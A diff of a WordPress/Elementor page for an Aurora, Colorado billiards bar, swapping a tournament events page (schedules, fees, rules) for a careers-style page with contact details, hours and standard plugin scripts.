-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4b5.svg" alt="💵" /> Entry: $20 (Includes Green Fee)</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f3c6.svg" alt="🏆" /> Format: Double Elimination — Modified BCA Rules</li>
-</ul>
-<h2 class="text-xl font-bold text-white mb-3"><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f525.svg" alt="🔥" /> Rules</h2>
-<ul class="text-white/80 space-y-1 text-sm">
-<li>Rack Your Own — Alt Break</li>
-<li>No Snaps</li>
-<li>Race to 3 (Front) — 8 Ball</li>
-<li>Race to 3 (Back) — 9 Ball</li>
-<li>100+ Fargo Difference Spots a Game</li>
-<li>Higher SL → Race to 4</li>
-<li> <img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4b8.svg" alt="💸" /> $100 Added at 16 Players</li>
-</ul>
-                    </div>
-                
-                <!-- CTA Button -->
-                <a href="https://utimebilliards.com/tournaments/saturday-night-tournament/" class="tournament-cta-btn">
-                    🔗
-                    Book This Tournament                </a>
-            </div>
-        </div>
-                <div class="tournament-card glassmorphism">
-            <div class="card-inner">
-                <!-- Day Badge -->
-                <div class="card-header">
-                    <span class="day-badge"
-                        style="background-color: #FFD70020; color: #FFD700;">
-                        FRIDAY                    </span>
-                </div>
-
-                <!-- Tournament Name -->
-                <h3 class="tournament-name">
-                    Tournament Night                </h3>
-
-                <!-- Description Content -->
-                                    <div class="tournament-description">
-                        <h2 class="text-2xl font-bold text-white mb-4"><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4cd.svg" alt="📍" /> Tournament Details</h2>
-<ul>
-<li><span class="text-[#FF3B3B] font-semibold">Venue:</span> U-TIME International, 1919 S Havana St, Aurora, CO 80014</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4dd.svg" alt="📝" /> Registration / Practice Opens: 6:30 PM</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f3af.svg" alt="🎯" /> First Game Starts: 7:30 PM</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4b5.svg" alt="💵" /> Entry: $20 (Includes Green Fee)</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f3c6.svg" alt="🏆" /> Format: Double Elimination — Modified BCA Rules</li>
-</ul>
-<h2 class="text-xl font-bold text-white mb-3"><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f525.svg" alt="🔥" /> Rules</h2>
-<ul class="text-white/80 space-y-1 text-sm">
-<li>Rack Your Own — Alt Break</li>
-<li>No Snaps</li>
-<li>Race to 3 (Front) — 8 Ball</li>
-<li>Race to 3 (Back) — 9 Ball</li>
-<li>100+ Fargo Difference Spots a Game</li>
-<li>Higher SL → Race to 4</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4b8.svg" alt="💸" /> $100 Added at 16 Players</li>
-</ul>
-                    </div>
-                
-                <!-- CTA Button -->
-                <a href="https://utimebilliards.com/tournaments/friday-night-tournament/" class="tournament-cta-btn">
-                    🔗
-                    Book This Tournament                </a>
-            </div>
-        </div>
-                <div class="tournament-card glassmorphism">
-            <div class="card-inner">
-                <!-- Day Badge -->
-                <div class="card-header">
-                    <span class="day-badge"
-                        style="background-color: #E67E2220; color: #E67E22;">
-                        TUESDAY                    </span>
-                </div>
-
-                <!-- Tournament Name -->
-                <h3 class="tournament-name">
-                    Tesuday night                </h3>
-
-                <!-- Description Content -->
-                                    <div class="tournament-description">
-                        <p>📍 Tournament Details<br />
-Venue: U-TIME International, 1919 S Havana St, Aurora, CO 80014<br />
-📝 Registration / Practice Opens: 6:30 PM<br />
-🎯 First Game Starts: 7:30 PM<br />
-💵 Entry: $20 (Includes Green Fee)<br />
-🏆 Format: Double Elimination — Modified BCA Rules<br />
-🔥 Rules<br />
-Rack Your Own — Alt Break<br />
-No Snaps<br />
-Race to 3 (Front) — 8 Ball<br />
-Race to 3 (Back) — 9 Ball<br />
-100+ Fargo Difference Spots a Game<br />
-Higher SL → Race to 4<br />
-💸 $100 Added at 16 Players</p>
-                    </div>
-                
-                <!-- CTA Button -->
-                <a href="https://utimebilliards.com/tournaments/test-tuesday/" class="tournament-cta-btn">
-                    🔗
-                    Book This Tournament                </a>
-            </div>
-        </div>
-                <div class="tournament-card glassmorphism">
-            <div class="card-inner">
-                <!-- Day Badge -->
-                <div class="card-header">
-                    <span class="day-badge"
-                        style="background-color: #00FF7F20; color: #00FF7F;">
-                        SUNDAY                    </span>
-                </div>
-
-                <!-- Tournament Name -->
-                <h3 class="tournament-name">
-                    APA Pool Tournament                </h3>
-
-                <!-- Description Content -->
-                                    <div class="tournament-description">
-                        <h2 class="text-2xl font-bold text-white mb-4"><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4cd.svg" alt="📍" /> Tournament Details</h2>
-<ul>
-<li><span class="text-[#FF3B3B] font-semibold">Location:</span> U-TIME International, 1919 S Havana St, Aurora, CO 80014</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4c5.svg" alt="📅" /> Day: Every Sunday</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f4dd.svg" alt="📝" /> Registration &amp; Practice Open: 2 PM</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/23f1.svg" alt="⏱" /> Start Time: 3 PM</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f3c5.svg" alt="🏅" /> APA Pool Tournament — Everyone Welcome</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f3b1.svg" alt="🎱" /> Games: 8-Ball (Front), 9-Ball (Back)</li>
-</ul>
-<h2 class="text-xl font-bold text-white mb-3"><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f525.svg" alt="🔥" /> Rules</h2>
-<ul class="text-white/80 space-y-1 text-sm">
-<li>APA Rules &amp; Races Apply</li>
-<li>All players — including non-APA players — may join</li>
-<li>SL determined by Tournament Director</li>
-<li><img decoding="async" class="emoji" role="img" src="https://s.w.org/images/core/emoji/17.0.2/svg/1f389.svg" alt="🎉" /> Compete for prizes &amp; have fun</li>
-</ul>
-                    </div>
-                
-                <!-- CTA Button -->
-                <a href="https://utimebilliards.com/tournaments/sunday-apa-pool-tournament/" class="tournament-cta-btn">
-                    🔗
-                    Book This Tournament                </a>
-            </div>
-        </div>
-                        </div>
-            </div>
-        </section>
-        
-
-
-    </div>
-  </section>
-
-  <!-- Recurring Events Tab Content -->
-  <section id="recurring-events" class="tab-content bg-[#081b33] hidden">
-        <!-- Monthly Tournament Calendar Section -->
-        <section class="py-16 bg-[#081b33]">
-            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                <div class="text-center mb-12">
-                    <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
-                        📅 Monthly Tournament <span class="text-[#FF3B3B]">Calendar</span>
-                    </h2>
-                    <p class="text-white/80 text-lg max-w-2xl mx-auto">
-                        Join us every week for exciting tournaments and competitive play. Our weekly schedule repeats every
-                        month!
-                    </p>
-                </div>
-
-                <!-- Calendar Container -->
-                <div id="calendar-container" class="max-w-5xl mx-auto">
-                    <!-- Calendar Header -->
-                    <div class="bg-black/30 rounded-t-2xl p-6 glassmorphism mb-0">
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-4">
-                                <h3 id="calendar-month-year" class="text-2xl font-bold text-white"></h3>
-                                <div class="flex gap-2">
-                                    <button id="prev-month"
-                                        class="w-10 h-10 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-all duration-300 text-lg">
-                                        ←
-                                    </button>
-                                    <button id="next-month"
-                                        class="w-10 h-10 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-all duration-300 text-lg">
-                                        →
-                                    </button>
-                                </div>
-                            </div>
-                            <div class="flex items-center gap-2">
-                                <span class="text-white/60 text-sm">Live Updates</span>
-                                <div class="w-2 h-2 bg-[#00FF00] rounded-full animate-pulse"></div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Calendar Grid -->
-                    <div class="bg-black/40 rounded-b-2xl overflow-hidden glassmorphism">
-                        <!-- Days of Week Header -->
-                        <div class="calendar-header">
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">MON</div>
-                                <div class="text-white/60 text-xs mt-1">Monday</div>
-                            </div>
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">TUE</div>
-                                <div class="text-white/60 text-xs mt-1">Tuesday</div>
-                            </div>
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">WED</div>
-                                <div class="text-white/60 text-xs mt-1">Wednesday</div>
-                            </div>
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">THU</div>
-                                <div class="text-white/60 text-xs mt-1">Thursday</div>
-                            </div>
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">FRI</div>
-                                <div class="text-white/60 text-xs mt-1">Friday</div>
-                            </div>
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">SAT</div>
-                                <div class="text-white/60 text-xs mt-1">Saturday</div>
-                            </div>
-                            <div class="p-4 text-center bg-black/20">
-                                <div class="text-white font-semibold text-sm">SUN</div>
-                                <div class="text-white/60 text-xs mt-1">Sunday</div>
-                            </div>
-                        </div>
-
-                        <!-- Calendar Days Container -->
-                        <div id="calendar-days" class="calendar-grid">
-                            <!-- Days will be dynamically generated here -->
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-        
-  </section>
-
-  <!-- Live Streams Section -->
-  <section class="py-16 bg-black">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <div class="text-center mb-12">
-        <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
-          📺 Live <span class="text-[#FF3B3B]">Streams</span>
-        </h2>
-        <p class="text-white/80 max-w-2xl mx-auto">
-          Can't make it to an event? Watch our live streams and catch all the action online!
-        </p>
-      </div>
-      
-      <div class="relative mb-8">
-        <div class="absolute -inset-4 bg-gradient-to-r from-[#FF3B3B]/20 to-[#00BFFF]/20 blur-lg rounded-2xl opacity-70"></div>
-        <div class="relative aspect-video rounded-2xl overflow-hidden">
-          <img decoding="async" 
-            src="https://utimebilliards.com/wp-content/uploads/2025/05/481079487_1075388411059799_5216598435923321742_n.jpg"
-            alt="U-TIME TV Live Stream"
-            class="w-full h-full object-cover" />
-          <div class="absolute inset-0 flex items-center justify-center bg-black/40">
-            <a href="https://youtube.com/@U-TIMETV" target="_blank" rel="noopener noreferrer" 
-               class="w-20 h-20 rounded-full bg-[#FF0000] flex items-center justify-center transform hover:scale-110 transition-transform duration-300">
-              <svg class="w-10 h-10 text-white" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814z"/>
-                <path fill="#000" d="M9.545 15.568V8.432L15.818 12z"/>
-              </svg>
-            </a>
-          </div>
-        </div>
-      </div>
-      
-      <div class="text-center">
-        <a href="https://youtube.com/@U-TIMETV" target="_blank" rel="noopener noreferrer" 
-           class="inline-flex items-center px-8 py-4 bg-[#FF0000] hover:bg-[#FF0000]/90 rounded-xl text-white font-bold transition-all duration-300">
-           Subscribe to Our Channel
-        </a>
-      </div>
-    </div>
-  </section>
-
-  <!-- Host Your Own Event Section -->
-  <section class="py-16 bg-[#081b33]">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <div class="text-center mb-12">
-        <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
-          Host Your Own <span class="text-[#FF3B3B]">Event</span>
-        </h2>
-        <p class="text-white/80 max-w-3xl mx-auto mb-8">
-          Looking to host a private party, celebration, or event at U-TIME? We offer customizable packages including private space, catering options, and personalized service.
-        </p>
-        
-        <button id="open-event-form" class="inline-flex items-center px-8 py-4 bg-[#FF3B3B] hover:bg-[#FF3B3B]/90 rounded-xl text-black font-bold transition-all duration-300">
-          Inquire About Event Hosting
-        </button>
-      </div>
-    </div>
-  </section>
-
-  <script>
-    // Tab functionality
-    const upcomingTab = document.getElementById('upcoming-tab');
-    const recurringTab = document.getElementById('recurring-tab');
-    const upcomingEvents = document.getElementById('upcoming-events');
-    const recurringEvents = document.getElementById('recurring-events');
-
-    function switchTab(activeTab, inactiveTab, activeContent, inactiveContent) {
-      // Update tab styles
-      activeTab.classList.add('bg-[#FF3B3B]', 'text-black');
-      activeTab.classList.remove('text-white/70', 'hover:text-white');
-      
-      inactiveTab.classList.remove('bg-[#FF3B3B]', 'text-black');
-      inactiveTab.classList.add('text-white/70', 'text-white');
-      
-      // Update content visibility
-      activeContent.classList.remove('hidden');
-      inactiveContent.classList.add('hidden');
-    }
-
-    upcomingTab.addEventListener('click', () => {
-      switchTab(upcomingTab, recurringTab, upcomingEvents, recurringEvents);
-    });
-
-    recurringTab.addEventListener('click', () => {
-      switchTab(recurringTab, upcomingTab, recurringEvents, upcomingEvents);
-    });
     
-    
-    document.addEventListener('DOMContentLoaded', function() {
-      const earlyAccessButton = document.getElementById('open-event-form');
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#FF3B3B]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">🏆</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">Tournaments</h3>
+        <p class="text-white/70">Help organize and run exciting competitions</p>
+      </div>
       
-      if (earlyAccessButton) {
-        earlyAccessButton.addEventListener('click', function() {
-          // Replace POPUP_ID with your actual Elementor popup ID
-          if (typeof elementorProFrontend !== 'undefined') {
-            elementorProFrontend.modules.popup.showPopup({id: 317});
-          }
-        });
-      }
-    });
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#00BFFF]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">🎉</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">Special Events</h3>
+        <p class="text-white/70">Be part of memorable celebrations</p>
+      </div>
+      
+      <div class="bg-black/30 rounded-xl p-6 glassmorphism hover:bg-black/40 transition-all duration-300">
+        <div class="w-12 h-12 rounded-xl bg-[#FF3B3B]/10 flex items-center justify-center mb-4">
+          <span class="text-2xl">👥</span>
+        </div>
+        <h3 class="text-xl font-bold text-white mb-2">Community</h3>
+        <p class="text-white/70">Connect with passionate players daily</p>
+      </div>
+    </div>
+    
+    <div class="text-center">
+      <a href="#events" class="inline-flex items-center px-8 py-4 bg-[#FF3B3B] hover:bg-[#FF3B3B]/90 rounded-xl text-black font-bold transition-all duration-300">
+        👉 View Upcoming Events
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3" />
+        </svg>
+      </a>
+    </div>
+  </div>
+</section>
 
-  </script>
-</body>
-</html>				</div>
+<!-- U-TIME TV Section -->
+<section class="py-16 bg-black font-[Montserrat]">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="text-center mb-12">
+      <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
+        Watch <span class="text-[#FF3B3B]">U-TIMETV</span>
+      </h2>
+      <p class="text-white/80 max-w-2xl mx-auto">
+        See what life at U-TIME looks like behind the scenes.
+      </p>
+    </div>
+    
+    <div class="relative mb-8">
+      <div class="absolute -inset-4 bg-gradient-to-r from-[#FF3B3B]/20 to-[#00BFFF]/20 blur-lg rounded-2xl opacity-70"></div>
+      <div class="relative aspect-video rounded-2xl overflow-hidden">
+        <img decoding="async" 
+          src="https://utimebilliards.com/wp-content/uploads/2025/05/481079487_1075388411059799_5216598435923321742_n.jpg"
+          alt="U-TIME TV Behind the Scenes"
+          class="w-full h-full object-cover" />
+        <div class="absolute inset-0 flex items-center justify-center bg-black/40">
+          <a href="https://youtube.com/@utimebilliards" target="_blank" rel="noopener noreferrer" 
+             class="w-20 h-20 rounded-full bg-[#FF0000] flex items-center justify-center transform hover:scale-110 transition-transform duration-300">
+            <svg class="w-10 h-10 text-white" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814z"/>
+              <path fill="#000" d="M9.545 15.568V8.432L15.818 12z"/>
+            </svg>
+          </a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="text-center">
+      <a href="https://youtube.com/@utimebilliards" target="_blank" rel="noopener noreferrer" 
+         class="inline-flex items-center px-8 py-4 bg-[#FF0000] hover:bg-[#FF0000]/90 rounded-xl text-white font-bold transition-all duration-300">
+        Watch on YouTube
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- Not Ready Yet Section -->
+<section class="py-16 bg-[#081b33] font-[Montserrat]">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="bg-black/30 rounded-xl p-8 glassmorphism text-center">
+      <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
+        Not Ready <span class="text-[#FF3B3B]">Yet?</span>
+      </h2>
+      <p class="text-white/80 mb-8 max-w-2xl mx-auto">
+        Stay in the loop. Join our VIP list and be the first to hear about future openings.
+      </p>
+      
+      <a href="#vip" class="inline-flex items-center px-8 py-4 bg-[#00BFFF] hover:bg-[#00BFFF]/90 rounded-xl text-black font-bold transition-all duration-300">
+        Join VIP List
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3" />
+        </svg>
+      </a>
+    </div>
+  </div>
+</section>
+
+<!-- Contact Section -->
+<section class="py-16 bg-black font-[Montserrat]">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+    <div class="text-center mb-12">
+      <h2 class="text-3xl sm:text-4xl font-bold text-white mb-6">
+        📍 Visit Us or <span class="text-[#FF3B3B]">Reach Out</span>
+      </h2>
+    </div>
+    
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+      <!-- Location & Contact Info -->
+      <div class="bg-black/30 rounded-xl p-8 glassmorphism">
+        <h3 class="text-2xl font-bold text-white mb-6">📍 Find Us</h3>
+        <div class="space-y-4">
+          <p class="text-white/80">
+            <span class="text-[#FF3B3B] font-semibold">Address:</span><br/>
+            1919 S Havana St., East Aurora, CO 80014
+          </p>
+          <p class="text-white/80">
+            <span class="text-[#FF3B3B] font-semibold">Phone:</span><br/>
+            📞 720-923-7147
+          </p>
+          <p class="text-white/80">
+            <span class="text-[#FF3B3B] font-semibold">Email:</span><br/>
+            📧 utimebilliards@gmail.com
+          </p>
+        </div>
+      </div>
+      
+      <!-- Hours -->
+      <div class="bg-black/30 rounded-xl p-8 glassmorphism">
+        <h3 class="text-2xl font-bold text-white mb-6">🕒 Hours</h3>
+        <div>
+          <ul class="text-white/80 space-y-2">
+            <li class="flex justify-between">
+              <span>Mon–Fri:</span>
+              <span>2:00 PM – 1:30 AM</span>
+            </li>
+            <li class="flex justify-between">
+              <span>Sat:</span>
+              <span>12:00 PM – 1:30 AM</span>
+            </li>
+            <li class="flex justify-between">
+              <span>Sun:</span>
+              <span>12:00 PM – 12:00 AM</span>
+            </li>
+          </ul>
+
+        </div>
+      </div>
+    </div>
+    
+    <div class="text-center mt-12">
+      <a href="/contact" class="inline-flex items-center px-8 py-4 bg-[#FF3B3B] hover:bg-[#FF3B3B]/90 rounded-xl text-black font-bold transition-all duration-300">
+        👉 Contact Us
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 4.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+        </svg>
+      </a>
+    </div>
+  </div>
+</section>
+
+				</div>
 				</div>
 				</div>
 				</div>
@@ -1995,6 +1863,7 @@ Higher SL → Race to 4<br />
 		})();
 	</script>
 	<link rel='stylesheet' id='wc-blocks-style-css' href='https://utimebilliards.com/wp-content/plugins/woocommerce/assets/client/blocks/wc-blocks.css?ver=wc-10.4.3' media='all' />
+<link rel='stylesheet' id='elementor-post-275-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-275.css?ver=1768619391' media='all' />
 <link rel='stylesheet' id='flatpickr-css' href='https://utimebilliards.com/wp-content/plugins/elementor/assets/lib/flatpickr/flatpickr.min.css?ver=4.6.13' media='all' />
 <link rel='stylesheet' id='elementor-post-222-css' href='https://utimebilliards.com/wp-content/uploads/elementor/css/post-222.css?ver=1768601877' media='all' />
 <link rel='stylesheet' id='elementor-icons-ekiticons-css' href='https://utimebilliards.com/wp-content/plugins/elementskit-lite/modules/elementskit-icon-pack/assets/css/ekiticons.css?ver=3.5.5' media='all' />
@@ -2014,7 +1883,7 @@ wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/pro-elements/assets/js/notes/notes.min.js?ver=3.29.0" id="elementor-pro-notes-js"></script>
 <script id="elementor-pro-notes-app-initiator-js-before">
-var elementorNotesConfig = {"route":{"title":"Events","url":"\/?p=303","note_url_pattern":"https:\/\/utimebilliards.com\/wp-admin\/admin.php?page=elementor-pro-notes-proxy&note-id={{NOTE_ID}}","post_id":303,"is_elementor_library":false},"direction":"ltr","is_debug":false,"current_user_can":{"create":true,"create_users":true,"edit_users":true},"urls":{"admin_url_create_user":"https:\/\/utimebilliards.com\/wp-admin\/user-new.php","admin_url_edit_user":"https:\/\/utimebilliards.com\/wp-admin\/user-edit.php","avatar_defaults":{"24":"https:\/\/secure.gravatar.com\/avatar\/?s=24&d=mm&r=g","48":"https:\/\/secure.gravatar.com\/avatar\/?s=48&d=mm&r=g","96":"https:\/\/secure.gravatar.com\/avatar\/?s=96&d=mm&r=g"},"help_notes_features":"https:\/\/go.elementor.com\/app-notes"}};
+var elementorNotesConfig = {"route":{"title":"Career","url":"\/?p=267","note_url_pattern":"https:\/\/utimebilliards.com\/wp-admin\/admin.php?page=elementor-pro-notes-proxy&note-id={{NOTE_ID}}","post_id":267,"is_elementor_library":false},"direction":"ltr","is_debug":false,"current_user_can":{"create":true,"create_users":true,"edit_users":true},"urls":{"admin_url_create_user":"https:\/\/utimebilliards.com\/wp-admin\/user-new.php","admin_url_edit_user":"https:\/\/utimebilliards.com\/wp-admin\/user-edit.php","avatar_defaults":{"24":"https:\/\/secure.gravatar.com\/avatar\/?s=24&d=mm&r=g","48":"https:\/\/secure.gravatar.com\/avatar\/?s=48&d=mm&r=g","96":"https:\/\/secure.gravatar.com\/avatar\/?s=96&d=mm&r=g"},"help_notes_features":"https:\/\/go.elementor.com\/app-notes"}};
 //# sourceURL=elementor-pro-notes-app-initiator-js-before
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/pro-elements/assets/js/notes/notes-app-initiator.min.js?ver=3.29.0" id="elementor-pro-notes-app-initiator-js"></script>
@@ -2049,11 +1918,6 @@ var elementorAppConfig = {"menu_url":"https:\/\/utimebilliards.com\/wp-admin\/ad
 //# sourceURL=elementor-app-loader-js-before
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/elementor/assets/js/app-loader.min.js?ver=3.33.4" id="elementor-app-loader-js"></script>
-<script id="utime-tournament-calendar-js-extra">
-var utime_calendar_data = {"schedule":[[{"name":"APA Pool Tournament","type":"green","url":"https://utimebilliards.com/tournaments/sunday-apa-pool-tournament/"}],[],[{"name":"Tesuday night","type":"orange","url":"https://utimebilliards.com/tournaments/test-tuesday/"}],[],[],[{"name":"Tournament Night","type":"gold","url":"https://utimebilliards.com/tournaments/friday-night-tournament/"}],[{"name":"Tournament Night","type":"red","url":"https://utimebilliards.com/tournaments/saturday-night-tournament/"}]]};
-//# sourceURL=utime-tournament-calendar-js-extra
-</script>
-<script src="https://utimebilliards.com/wp-content/plugins/utime-custom/assets/js/tournament-calendar.js?ver=1.0.0" id="utime-tournament-calendar-js"></script>
 <script src="https://utimebilliards.com/wp-content/plugins/shopengine/assets/js/simple-scrollbar.js?ver=4.8.7" id="shopengine-simple-scrollbar.js-js-js"></script>
 <script src="https://utimebilliards.com/wp-content/plugins/shopengine/assets/js/filter.js?ver=4.8.7" id="shopengine-filter-js-js"></script>
 <script id="shopengine-js-js-extra">
@@ -2062,10 +1926,10 @@ var shopEngineApiSettings = {"resturl":"https://utimebilliards.com/wp-json/","re
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/shopengine/assets/js/public.js?ver=4.8.7" id="shopengine-js-js"></script>
 <script src="https://utimebilliards.com/wp-content/themes/hello-elementor/assets/js/hello-frontend.min.js?ver=3.4.4" id="hello-theme-frontend-js"></script>
-<script src="https://utimebilliards.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.33.4" id="elementor-webpack-runtime-js"></script>
+<script src="https://utimebilliards.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.33.4"id="elementor-webpack-runtime-js"></script>
 <script src="https://utimebilliards.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.33.4" id="elementor-frontend-modules-js"></script>
 <script id="elementor-frontend-js-before">
-var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.33.4","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"cloud-library":true,"e_opt_in_v4_page":true,"import-export-customization":true},"urls":{"assets":"https:\/\/utimebilliards.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/utimebilliards.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/utimebilliards.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"f5f6e510e4"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","woocommerce_notices_elements":[],"hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":303,"title":"Events%20%E2%80%93%20U-TIME%20International%20Billiards%20and%20Sports%20Bar","excerpt":"","featuredImage":false},"user":{"roles":["administrator"]}};
